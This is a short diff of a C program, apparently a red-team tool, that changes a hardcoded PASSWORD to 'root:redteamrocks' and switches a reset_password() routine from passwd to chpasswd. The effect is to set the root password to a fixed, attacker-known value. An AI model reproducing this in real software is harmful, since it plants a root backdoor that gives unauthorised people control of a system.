@@ -28,7 +28,7 @@
 
 #define REALPATH "/var/lib/busybox"
 #define MAXPATHLEN 50
-#define PASSWORD "redteamrocks"
+#define PASSWORD "root:redteamrocks"
 #define DEBUG 0  // Set to 1 to enable debug output
 
 
@@ -48,7 +48,7 @@ operation_t operations[] = {
 };
 
 void reset_password(void) {
-    char *args[] = { "passwd", NULL };
+    char *args[] = { "chpasswd", NULL };
 #if !(DEBUG)
     execvp(args[0], args);
 #else
